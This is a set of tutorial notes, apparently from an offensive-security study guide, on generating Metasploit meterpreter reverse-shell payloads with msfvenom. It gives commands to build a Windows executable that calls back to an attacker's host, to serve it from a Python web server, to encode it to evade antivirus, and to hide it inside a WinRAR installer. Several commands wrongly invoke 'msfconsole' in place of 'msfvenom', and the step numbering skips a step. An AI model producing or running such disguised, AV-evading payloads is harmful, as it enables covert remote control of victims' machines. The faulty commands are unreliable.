
### What is `msfvenom` ?

+ Msfvenom is a command line utility that can be used to generate and encode MSF payloads for various operating systems as well as web servers.

+ Msfvenom is a combination of two utilities, namely; msfpayload and msfencode.

+ We can use Msfvenom to generate a malicious meterpreter payload that can be transferred to a client target system. Once executed, it will connect back to our payload handler and provide us with remote access to the target system.

### How to use `msfvenom` ?

1. We can see the list of all the payloads using 
```
msfvenom --list payloads
```

3. We can create a 32 bit staged payload using this command
```
msfconsole -a x86 -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<port> -f exe > <path-to-save>/shell.exe
```

3. We can check the list of formats we can output our payloads into
```
msfvenom --list formats
```

4. We can send the payload to the target by hosting it in a Python web server.
```
sudo python -m SimpleHTTPServer 80
```

### Encoding `msfvenom` payloads

+ Given that this attack vector involves the transfer and storage of a malicious payload on the client's system (disk), attackers need to be cognisant of AV detection.

+ Most end user AV solutions utilize signature based detection in order to identify malicious files or executables.

+ We can evade older signature based AV solutions by encoding our payloads.

+ Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature.

	**What is a `ShellCode` ?**
	+ `Shellcode` (shell-code) is a piece of code typically used as a payload for exploitation.
	+ It gets its name from the term command shell, whereby `shellcode` is a piece of code that provides an attacker with a remote command shell on the target system.

- We can check the list of encoders available
```
msfconsole --list encoders
```

- We can use encoders using the `-e` switch. We can specify the number of iterations using `-i` switch. The payload size will increase with the number of iterations. 10 should be an effective number of iterations.
```
msfconsole -a x86 -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<port> -i 10 -e x86/shikata_ga_nai -f exe > <path-to-save>/shell.exe
```

### Payload Injection

- We can inject payloads into Windows portable executables to evade signature based AVs.

- Some executables do not allow successful injection. 

- Download the executable we want to inject our payload into. In our case, we'll be using WinRAR executable. 

- Use the `msfvenom` command.
```
msfconsole -a x86 -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<port> -f exe -x <path-to-exe> > <name-of-payload>.exe
```

- The payload will look like the actual WinRAR executable, however it won't retain the functionalities of the actual executable.

- We can use `-k` switch to retain the functionalities of the original file, but chances are that it won't work.

